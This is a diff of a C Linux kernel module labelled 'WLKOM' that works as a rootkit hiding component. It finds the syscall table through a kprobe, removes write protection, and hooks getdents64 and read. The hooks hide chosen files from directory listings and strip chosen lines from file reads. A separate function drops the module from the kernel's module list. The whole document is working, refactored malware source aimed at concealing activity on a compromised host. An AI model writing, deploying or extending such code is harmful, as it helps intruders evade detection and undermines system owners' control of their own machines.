@@ -1,35 +1,31 @@
 #include "hide.h"
 
+#include <asm/cacheflush.h>
 #include <linux/kallsyms.h>
 #include <linux/kernel.h>
+#include <linux/kprobes.h>
 #include <linux/list.h>
 #include <linux/module.h>
-#include <linux/proc_fs.h>
 #include <linux/slab.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
 #include <linux/version.h>
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
-#    define KPROBE_LOOKUP 1
-#    include <linux/kprobes.h>
-static struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
-#endif
+/* ── kallsyms_lookup_name via kprobe (kernel >= 5.7) ── */
 
+static struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 
 static unsigned long *syscall_table = NULL;
 
 static long (*orig_getdents64)(unsigned int fd,
-                               struct linux_dirent64 __user *dirent,
-                               unsigned int count) = NULL;
-
-static long (*orig_getdents)(unsigned int fd,
-                             struct linux_dirent __user *dirent,
-                             unsigned int count) = NULL;
+                                struct linux_dirent64 __user *dirent,
+                                unsigned int count) = NULL;
 
 static long (*orig_read)(unsigned int fd, char __user *buf,
-                         size_t count) = NULL;
+                          size_t count) = NULL;
+
+/* ── hidden lists ── */
 
 struct hidden_file
 {
@@ -49,238 +45,148 @@ static LIST_HEAD(hidden_lines);
 
 /* ── write-protect helpers ── */
 
-/**
- * @brief Disables CR0 write-protection to allow syscall table modification.
- *        Uses raw inline asm instead of write_cr0() because since Linux 5.10
- *        the kernel wrapper actively re-pins the WP bit, making it useless.
- */
-static void disable_write_protect(void)
+static void set_addr_rw(unsigned long addr)
 {
-    unsigned long cr0;
+    unsigned int level;
+    pte_t       *pte = lookup_address(addr, &level);
 
-    asm volatile("mov %%cr0, %0" : "=r" (cr0));
-    cr0 &= ~0x00010000UL;
-    asm volatile("mov %0, %%cr0" : : "r" (cr0) : "memory");
+    if (pte)
+        pte->pte |= _PAGE_RW;
 }
 
-/**
- * @brief Re-enables CR0 write-protection after syscall table modification.
- */
-static void enable_write_protect(void)
+static void set_addr_ro(unsigned long addr)
 {
-    unsigned long cr0;
+    unsigned int level;
+    pte_t       *pte = lookup_address(addr, &level);
 
-    asm volatile("mov %%cr0, %0" : "=r" (cr0));
-    cr0 |= 0x00010000UL;
-    asm volatile("mov %0, %%cr0" : : "r" (cr0) : "memory");
+    if (pte)
+        pte->pte &= ~_PAGE_RW;
 }
 
-/* ── dirent filtering ── */
+/* ── hooked getdents64 ── */
 
-/**
- * @brief Removes hidden file entries from a getdents64 kernel buffer in-place.
- * @param buf  Kernel copy of the dirent64 buffer.
- * @param ret  Original buffer size in bytes.
- * @return New buffer size after removals.
- */
-static long filter_dirent64(char *buf, long ret)
+static long hooked_getdents64(unsigned int                   fd,
+                               struct linux_dirent64 __user *dirent,
+                               unsigned int                   count)
 {
-    struct hidden_file    *hf;
-    struct linux_dirent64 *d;
-    long                   new_ret = ret;
-    int                    bpos    = 0;
+    long                          ret;
+    long                          new_ret;
+    struct hidden_file           *hf;
+    char                         *buf;
+    int                           bpos = 0;
+    struct linux_dirent64 __user *real_dirent;
 
-    while (bpos < ret)
+    ret = orig_getdents64(fd, dirent, count);
+    if (ret <= 0 || list_empty(&hidden_files))
+        return ret;
+
+    /* With CONFIG_ARCH_HAS_SYSCALL_WRAPPER, the kernel passes a pt_regs *
+     * in the first argument slot (fd here = that pointer, a kernel address).
+     * The real user dirent pointer lives at inner_regs->si. */
+    if ((unsigned long)fd > 0xffff000000000000UL)
+        real_dirent = (struct linux_dirent64 __user *)
+                      ((struct pt_regs *)(unsigned long)fd)->si;
+    else
+        real_dirent = dirent;
+
+    new_ret = ret;
+    buf = kmalloc(ret, GFP_KERNEL);
+    if (!buf)
+        return ret;
+
+    if (copy_from_user(buf, real_dirent, ret))
     {
-        d = (struct linux_dirent64 *)(buf + bpos);
-        list_for_each_entry(hf, &hidden_files, list)
-        {
-            if (strcmp(d->d_name, hf->name) == 0)
-            {
-                memmove(buf + bpos, buf + bpos + d->d_reclen,
-                        ret - bpos - d->d_reclen);
-                new_ret -= d->d_reclen;
-                ret     -= d->d_reclen;
-                goto next64;
-            }
-        }
-        bpos += d->d_reclen;
-    next64:;
+        kfree(buf);
+        return ret;
     }
-    return new_ret;
-}
-
-/**
- * @brief Removes hidden file entries from a getdents (32-bit) kernel buffer.
- * @param buf  Kernel copy of the dirent buffer.
- * @param ret  Original buffer size in bytes.
- * @return New buffer size after removals.
- */
-static long filter_dirent(char *buf, long ret)
-{
-    struct hidden_file  *hf;
-    struct linux_dirent *d;
-    long                 new_ret = ret;
-    int                  bpos    = 0;
 
     while (bpos < ret)
     {
-        d = (struct linux_dirent *)(buf + bpos);
+        struct linux_dirent64 *d      = (struct linux_dirent64 *)(buf + bpos);
+        int                    reclen = d->d_reclen;
+
+        if (reclen == 0 || bpos + reclen > ret)
+            break;
+
         list_for_each_entry(hf, &hidden_files, list)
         {
             if (strcmp(d->d_name, hf->name) == 0)
             {
-                memmove(buf + bpos, buf + bpos + d->d_reclen,
-                        ret - bpos - d->d_reclen);
-                new_ret -= d->d_reclen;
-                ret     -= d->d_reclen;
+                memmove(buf + bpos, buf + bpos + reclen,
+                        ret - bpos - reclen);
+                new_ret -= reclen;
+                ret     -= reclen;
                 goto next;
             }
         }
-        bpos += d->d_reclen;
+        bpos += reclen;
     next:;
     }
-    return new_ret;
-}
 
-/* ── hooked syscalls ── */
-
-/**
- * @brief Hooked getdents64: filters hidden files from directory listings.
- * @param fd      File descriptor of the directory.
- * @param dirent  Userspace dirent64 buffer.
- * @param count   Buffer size.
- * @return Number of bytes in the filtered buffer, or original ret on error.
- */
-static long hooked_getdents64(unsigned int fd,
-                              struct linux_dirent64 __user *dirent,
-                              unsigned int count)
-{
-    long  ret = orig_getdents64(fd, dirent, count);
-    char *buf;
-    long  new_ret;
-
-    if (ret <= 0)
-        return ret;
-    buf = kmalloc(ret, GFP_KERNEL);
-    if (!buf)
-        return ret;
-    if (copy_from_user(buf, dirent, ret))
-    {
-        kfree(buf);
-        return ret;
-    }
-    new_ret = filter_dirent64(buf, ret);
-    if (copy_to_user(dirent, buf, new_ret))
-        pr_warn("WLKOM: copy_to_user failed\n");
+    (void)copy_to_user(real_dirent, buf, new_ret);
     kfree(buf);
     return new_ret;
 }
 
-/**
- * @brief Hooked getdents (32-bit compat): filters hidden files.
- * @param fd      File descriptor of the directory.
- * @param dirent  Userspace dirent buffer.
- * @param count   Buffer size.
- * @return Number of bytes in the filtered buffer, or original ret on error.
- */
-static long hooked_getdents(unsigned int fd,
-                            struct linux_dirent __user *dirent,
-                            unsigned int count)
-{
-    long  ret = orig_getdents(fd, dirent, count);
-    char *buf;
-    long  new_ret;
+/* ── hooked read (line filtering) ── */
 
-    if (ret <= 0)
-        return ret;
-    buf = kmalloc(ret, GFP_KERNEL);
-    if (!buf)
-        return ret;
-    if (copy_from_user(buf, dirent, ret))
-    {
-        kfree(buf);
-        return ret;
-    }
-    new_ret = filter_dirent(buf, ret);
-    if (copy_to_user(dirent, buf, new_ret))
-        pr_warn("WLKOM: copy_to_user failed\n");
-    kfree(buf);
-    return new_ret;
-}
-
-/* ── line filtering ── */
-
-/**
- * @brief Removes lines matching any hidden_line pattern from a kernel buffer.
- * @param kbuf  Kernel buffer containing file content (null-terminated).
- * @param size  Current content size.
- * @return New content size after line removals.
- */
-static long filter_lines(char *kbuf, long size)
-{
-    struct hidden_line *hl;
-    char               *pos;
-    char               *line_start;
-    char               *line_end;
-    long                new_size = size;
-    int                 line_len;
-
-    list_for_each_entry(hl, &hidden_lines, list)
-    {
-        pos = kbuf;
-        while ((pos = strstr(pos, hl->pattern)) != NULL)
-        {
-            line_start = pos;
-            while (line_start > kbuf && *(line_start - 1) != '\n')
-                line_start--;
-            line_end = strchr(pos, '\n');
-            line_end = line_end ? line_end + 1 : kbuf + new_size;
-            line_len = line_end - line_start;
-            memmove(line_start, line_end, new_size - (line_end - kbuf));
-            new_size      -= line_len;
-            kbuf[new_size] = '\0';
-        }
-    }
-    return new_size;
-}
-
-/**
- * @brief Hooked read: strips lines containing hidden patterns before returning.
- * @param fd     File descriptor.
- * @param buf    Userspace destination buffer.
- * @param count  Read size.
- * @return Filtered byte count, or original ret on error.
- */
 static long hooked_read(unsigned int fd, char __user *buf, size_t count)
 {
-    long  ret = orig_read(fd, buf, count);
-    char *kbuf;
-    long  new_ret;
+    long                ret     = orig_read(fd, buf, count);
+    long                new_ret = ret;
+    struct hidden_line *hl;
+    char               *kbuf;
+    char __user        *real_buf;
 
-    if (ret <= 0)
+    if (ret <= 0 || list_empty(&hidden_lines))
         return ret;
+
+    /* Same pt_regs wrapper issue: real buf pointer is at inner_regs->si */
+    if ((unsigned long)fd > 0xffff000000000000UL)
+        real_buf = (char __user *)
+                   ((struct pt_regs *)(unsigned long)fd)->si;
+    else
+        real_buf = buf;
+
     kbuf = kmalloc(ret + 1, GFP_KERNEL);
     if (!kbuf)
         return ret;
-    if (copy_from_user(kbuf, buf, ret))
+
+    if (copy_from_user(kbuf, real_buf, ret))
     {
         kfree(kbuf);
         return ret;
     }
     kbuf[ret] = '\0';
-    new_ret   = filter_lines(kbuf, ret);
-    if (copy_to_user(buf, kbuf, new_ret))
-        pr_warn("WLKOM: copy_to_user failed\n");
+
+    list_for_each_entry(hl, &hidden_lines, list)
+    {
+        char *pos = kbuf;
+
+        while ((pos = strstr(pos, hl->pattern)) != NULL)
+        {
+            char *line_start = pos;
+            char *line_end;
+            int   line_len;
+
+            while (line_start > kbuf && *(line_start - 1) != '\n')
+                line_start--;
+            line_end = strchr(pos, '\n');
+            line_end = line_end ? line_end + 1 : kbuf + new_ret;
+            line_len = line_end - line_start;
+            memmove(line_start, line_end, new_ret - (line_end - kbuf));
+            new_ret        -= line_len;
+            kbuf[new_ret]   = '\0';
+        }
+    }
+
+    (void)copy_to_user(real_buf, kbuf, new_ret);
     kfree(kbuf);
     return new_ret;
 }
 
 /* ── public API ── */
 
-/**
- * @brief Removes the module from lsmod and /proc/modules.
- */
 void hide_module(void)
 {
     list_del_init(&THIS_MODULE->list);
@@ -289,10 +195,6 @@ void hide_module(void)
 #endif
 }
 
-/**
- * @brief Adds a filename to the hidden files list (hidden from ls/readdir).
- * @param name  Filename to hide (basename only, not a full path).
- */
 void hide_file(const char *name)
 {
     struct hidden_file *hf = kmalloc(sizeof(*hf), GFP_KERNEL);
@@ -304,14 +206,9 @@ void hide_file(const char *name)
     list_add(&hf->list, &hidden_files);
 }
 
-/**
- * @brief Removes a filename from the hidden files list.
- * @param name  Filename to unhide.
- */
 void unhide_file(const char *name)
 {
-    struct hidden_file *hf;
-    struct hidden_file *tmp;
+    struct hidden_file *hf, *tmp;
 
     list_for_each_entry_safe(hf, tmp, &hidden_files, list)
     {
@@ -323,11 +220,6 @@ void unhide_file(const char *name)
     }
 }
 
-/**
- * @brief Registers a pattern to hide from reads of a specific file.
- * @param filename  Absolute path of the file to filter.
- * @param pattern   Substring: any line containing it will be stripped.
- */
 void hide_line(const char *filename, const char *pattern)
 {
     struct hidden_line *hl = kmalloc(sizeof(*hl), GFP_KERNEL);
@@ -341,15 +233,9 @@ void hide_line(const char *filename, const char *pattern)
     list_add(&hl->list, &hidden_lines);
 }
 
-/**
- * @brief Removes a (filename, pattern) entry from the hidden lines list.
- * @param filename  File path previously registered.
- * @param pattern   Pattern previously registered.
- */
 void unhide_line(const char *filename, const char *pattern)
 {
-    struct hidden_line *hl;
-    struct hidden_line *tmp;
+    struct hidden_line *hl, *tmp;
 
     list_for_each_entry_safe(hl, tmp, &hidden_lines, list)
     {
@@ -364,37 +250,55 @@ void unhide_line(const char *filename, const char *pattern)
 
 /* ── init / exit ── */
 
-/**
- * @brief Resolves kallsyms_lookup_name and uses it to find sys_call_table.
- *        On kernel >= 5.7 kallsyms_lookup_name is no longer exported,
- *        so we use a kprobe to locate it at runtime.
- * @return Pointer to sys_call_table, or NULL on failure.
- */
-static unsigned long *find_syscall_table(void)
+int hide_init(void)
 {
-    kallsyms_lookup_name_t fn;
+    kallsyms_lookup_name_t kallsyms_fn;
 
-#ifdef KPROBE_LOOKUP
+    pr_info("WLKOM hide: initializing (syscall table)...\n");
+
     register_kprobe(&kp);
-    fn = (kallsyms_lookup_name_t)kp.addr;
+    kallsyms_fn = (kallsyms_lookup_name_t)kp.addr;
     unregister_kprobe(&kp);
-#else
-    fn = kallsyms_lookup_name;
-#endif
-    if (!fn)
-        return NULL;
-    return (unsigned long *)fn("sys_call_table");
+
+    if (!kallsyms_fn)
+    {
+        pr_err("WLKOM hide: failed to find kallsyms_lookup_name\n");
+        return -1;
+    }
+
+    syscall_table = (unsigned long *)kallsyms_fn("sys_call_table");
+    if (!syscall_table)
+    {
+        pr_err("WLKOM hide: failed to find sys_call_table\n");
+        return -1;
+    }
+
+    pr_info("WLKOM hide: sys_call_table at %px\n", syscall_table);
+
+    orig_getdents64 = (typeof(orig_getdents64))syscall_table[__NR_getdents64];
+    orig_read       = (typeof(orig_read))syscall_table[__NR_read];
+
+    set_addr_rw((unsigned long)syscall_table);
+    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
+    syscall_table[__NR_read]       = (unsigned long)hooked_read;
+    set_addr_ro((unsigned long)syscall_table);
+
+    pr_info("WLKOM hide: syscalls hooked\n");
+    return 0;
 }
 
-/**
- * @brief Frees all entries in hidden_files and hidden_lines lists.
- */
-static void free_lists(void)
+void hide_exit(void)
 {
-    struct hidden_file *hf;
-    struct hidden_file *hf_tmp;
-    struct hidden_line *hl;
-    struct hidden_line *hl_tmp;
+    struct hidden_file *hf, *hf_tmp;
+    struct hidden_line *hl, *hl_tmp;
+
+    if (!syscall_table)
+        return;
+
+    set_addr_rw((unsigned long)syscall_table);
+    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
+    syscall_table[__NR_read]       = (unsigned long)orig_read;
+    set_addr_ro((unsigned long)syscall_table);
 
     list_for_each_entry_safe(hf, hf_tmp, &hidden_files, list)
     {
@@ -406,46 +310,6 @@ static void free_lists(void)
         list_del(&hl->list);
         kfree(hl);
     }
-}
 
-/**
- * @brief Hooks getdents64, getdents and read syscalls.
- * @return 0 on success, -1 if sys_call_table cannot be found.
- */
-int hide_init(void)
-{
-    pr_info("WLKOM hide: initializing...\n");
-    syscall_table = find_syscall_table();
-    if (!syscall_table)
-    {
-        pr_err("WLKOM hide: syscall_table not found\n");
-        return -1;
-    }
-    pr_info("WLKOM hide: syscall_table at %px\n", syscall_table);
-    orig_getdents64 = (typeof(orig_getdents64))syscall_table[__NR_getdents64];
-    orig_getdents   = (typeof(orig_getdents))syscall_table[__NR_getdents];
-    orig_read       = (typeof(orig_read))syscall_table[__NR_read];
-    disable_write_protect();
-    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
-    syscall_table[__NR_getdents]   = (unsigned long)hooked_getdents;
-    syscall_table[__NR_read]       = (unsigned long)hooked_read;
-    enable_write_protect();
-    pr_info("WLKOM hide: syscalls hooked\n");
-    return 0;
-}
-
-/**
- * @brief Restores original syscalls and frees all hidden entries.
- */
-void hide_exit(void)
-{
-    if (!syscall_table)
-        return;
-    disable_write_protect();
-    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
-    syscall_table[__NR_getdents]   = (unsigned long)orig_getdents;
-    syscall_table[__NR_read]       = (unsigned long)orig_read;
-    enable_write_protect();
-    free_lists();
     pr_info("WLKOM hide: exited\n");
 }
